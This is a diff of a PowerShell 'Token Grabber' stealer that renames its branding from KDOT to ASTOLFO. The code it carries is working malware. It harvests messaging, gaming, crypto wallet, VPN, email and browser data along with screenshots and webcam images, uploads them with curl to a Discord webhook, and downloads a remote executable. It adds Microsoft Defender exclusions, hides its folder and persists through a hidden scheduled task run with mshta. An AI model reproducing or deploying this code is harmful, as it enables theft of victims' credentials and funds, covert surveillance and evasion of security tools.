@@ -214,14 +214,14 @@ function Request-Admin {
 }
 
 function EXFILTRATE-DATA {
-    $folder_general = "$env:APPDATA\KDOT\DATA"
-    $folder_messaging = "$env:APPDATA\KDOT\DATA\Messaging Sessions"
-    $folder_gaming = "$env:APPDATA\KDOT\DATA\Gaming Sessions"
-    $folder_crypto = "$env:APPDATA\KDOT\DATA\Crypto Wallets"
-	$folder_vpn = "$env:APPDATA\KDOT\DATA\VPN Clients"
-    $folder_email = "$env:APPDATA\KDOT\DATA\Email Clients"
-    $important_files = "$env:APPDATA\KDOT\DATA\Important Files"
-	$browser_data = "$env:APPDATA\KDOT\DATA\Browser Data"
+    $folder_general = "$env:APPDATA\ASTOLFO\DATA"
+    $folder_messaging = "$env:APPDATA\ASTOLFO\DATA\Messaging Sessions"
+    $folder_gaming = "$env:APPDATA\ASTOLFO\DATA\Gaming Sessions"
+    $folder_crypto = "$env:APPDATA\ASTOLFO\DATA\Crypto Wallets"
+	$folder_vpn = "$env:APPDATA\ASTOLFO\DATA\VPN Clients"
+    $folder_email = "$env:APPDATA\ASTOLFO\DATA\Email Clients"
+    $important_files = "$env:APPDATA\ASTOLFO\DATA\Important Files"
+	$browser_data = "$env:APPDATA\ASTOLFO\DATA\Browser Data"
 
     New-Item -ItemType Directory -Path $folder_general -Force
     New-Item -ItemType Directory -Path $folder_messaging -Force
@@ -667,9 +667,9 @@ function EXFILTRATE-DATA {
     Invoke-Crypto_Wallets
 
     $embed_and_body = @{
-        "username" = "KDOT"
+        "username" = "ASTOLFO"
         "content" = "@everyone"
-        "title" = "KDOT"
+        "title" = "ASTOLFO"
         "description" = "Powerful Token Grabber"
         "color" = "3447003"
         "avatar_url" = "https://i.postimg.cc/k58gQ03t/PTG.gif"
@@ -677,11 +677,11 @@ function EXFILTRATE-DATA {
         "embeds" = @(
             @{
                 "title" = "POWERSHELL GRABBER"
-                "url" = "https://github.com/KDot227/Powershell-Token-Grabber/tree/main"
+                "url" = "https://github.com/ASTOLFO227/Powershell-Token-Grabber/tree/main"
                 "description" = "New victim info collected !"
                 "color" = "3447003"
                 "footer" = @{
-                    "text" = "Made by KDOT, GODFATHER and CHAINSKI"
+                    "text" = "Made by ASTOLFO, GODFATHER and CHAINSKI"
                 }
                 "thumbnail" = @{
                     "url" = "https://i.postimg.cc/k58gQ03t/PTG.gif"
@@ -940,12 +940,12 @@ function EXFILTRATE-DATA {
     }
     Invoke-GrabFiles
 
-    curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$folder_general\desktop-screenshot.png\`"" $webhook | out-null
+    curl.exe -F "payload_json={\`"username\`": \`"ASTOLFO\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$folder_general\desktop-screenshot.png\`"" $webhook | out-null
 
     $items = Get-ChildItem -Path "$folder_general" -Filter out*.jpg
     foreach ($item in $items) {
         $name = $item.Name
-        curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$folder_general\$name\`"" $webhook | out-null
+        curl.exe -F "payload_json={\`"username\`": \`"ASTOLFO\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$folder_general\$name\`"" $webhook | out-null
         Remove-Item -Path "$folder_general\$name" -Force
     }
 	
@@ -966,7 +966,7 @@ function EXFILTRATE-DATA {
         Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force | Out-Null
     } catch {}
 
-    (New-Object System.Net.WebClient).DownloadFile("https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.2/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")
+    (New-Object System.Net.WebClient).DownloadFile("https://github.com/ASTOLFO227/Powershell-Token-Grabber/releases/download/V4.2/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")
 
     Stop-Process -Name "discord" -Force | Out-Null
     Stop-Process -Name "discordcanary" -Force | Out-Null
@@ -988,10 +988,10 @@ function EXFILTRATE-DATA {
         $dirs | Foreach-Object { Remove-Item $_ }
     } while ($dirs.count -gt 0)
 
-    Compress-Archive -Path "$folder_general" -DestinationPath "$env:LOCALAPPDATA\Temp\KDOT.zip" -Force
-    curl.exe -X POST -F 'payload_json={\"username\": \"KDOT\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/k58gQ03t/PTG.gif\"}' -F "file=@$env:LOCALAPPDATA\Temp\KDOT.zip" $webhook
+    Compress-Archive -Path "$folder_general" -DestinationPath "$env:LOCALAPPDATA\Temp\ASTOLFO.zip" -Force
+    curl.exe -X POST -F 'payload_json={\"username\": \"ASTOLFO\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/k58gQ03t/PTG.gif\"}' -F "file=@$env:LOCALAPPDATA\Temp\ASTOLFO.zip" $webhook
 
-    Remove-Item "$env:LOCALAPPDATA\Temp\KDOT.zip" -Force
+    Remove-Item "$env:LOCALAPPDATA\Temp\ASTOLFO.zip" -Force
     Remove-Item "$folder_general" -Force -Recurse
     Remove-Item "$main_temp\main.exe" -Force
 }
@@ -999,17 +999,17 @@ function EXFILTRATE-DATA {
 
 function Invoke-TASKS {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
-    Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
-    New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" -Force
+    Add-MpPreference -ExclusionPath "$env:APPDATA\ASTOLFO"
+    New-Item -ItemType Directory -Path "$env:APPDATA\ASTOLFO" -Force
     # Hidden Directory
-    $KDOT_DIR = get-item "$env:APPDATA\KDOT" -Force
-    $KDOT_DIR.attributes = "Hidden", "System"
-    Copy-Item -Path $PSCommandPath -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
-    $task_name = "KDOT"
-    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\kdot\kdot.ps1",0)(window.close)'
+    $ASTOLFO_DIR = get-item "$env:APPDATA\ASTOLFO" -Force
+    $ASTOLFO_DIR.attributes = "Hidden", "System"
+    Copy-Item -Path $PSCommandPath -Destination "$env:APPDATA\ASTOLFO\ASTOLFO.ps1" -Force
+    $task_name = "ASTOLFO"
+    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\ASTOLFO\ASTOLFO.ps1",0)(window.close)'
     $task_trigger = New-ScheduledTaskTrigger -AtLogOn
     $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
-    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force
+    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "ASTOLFO" -RunLevel Highest -Force
     EXFILTRATE-DATA
 }
 
